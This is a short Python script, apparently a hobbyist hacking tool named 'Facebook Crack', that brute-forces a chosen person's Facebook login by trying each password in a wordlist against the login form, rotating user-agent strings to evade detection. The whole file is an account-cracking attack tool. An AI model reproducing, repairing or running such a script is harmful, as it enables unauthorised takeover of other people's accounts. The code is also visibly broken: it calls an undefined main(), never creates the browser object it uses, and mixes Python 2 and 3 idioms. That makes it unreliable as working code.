import sys
import mechanize
import cookielib
import random

email = input("Enter the Facebook Username (or) Email (or) Phone Number : ")
passwordlist = input("Enter the wordlist name and path : ")
login = 'https://www.facebook.com/login.php?login_attempt=1'

useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

def brute(password):
    sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
    sys.stdout.flush()
    br.addheaders = [('User-agent', random.choice(useragents))]
    site = br.open(login)
    br.select_form(nr=0)
    br.form['email'] = email
    br.form['pass'] = password
    sub = br.submit()
    log = sub.geturl()
    if log != login and (not 'login_attempt' in log):
        print("\n\n[+] Password Find = {}".format(password))
        input("ANY KEY to Exit....")
        sys.exit(1)

def search():
    global password
    passwords = open(passwordlist, "r")
    for password in passwords:
        password = password.replace("\n", "")
        brute(password)

def welcome():
    wel = """
        +=========================================+
        |..........   Facebook Crack   ...........|
        +-----------------------------------------+
        |            #Author: Ha3MrX              | 
        |	       Version 1.0                |
 	|   https://www.youtube.com/c/HA-MRX      |
        +=========================================+
        |..........  Facebook Cracker  ...........|
        +-----------------------------------------+\n\n
    """
    total = open(passwordlist, "r")
    total = total.readlines()
    print(wel)
    print(" [*] Account to crack : {}".format(email))
    print(" [*] Loaded :", len(total), "passwords")
    print(" [*] Cracking, please wait ...\n\n")

if __name__ == '__main__':
    main()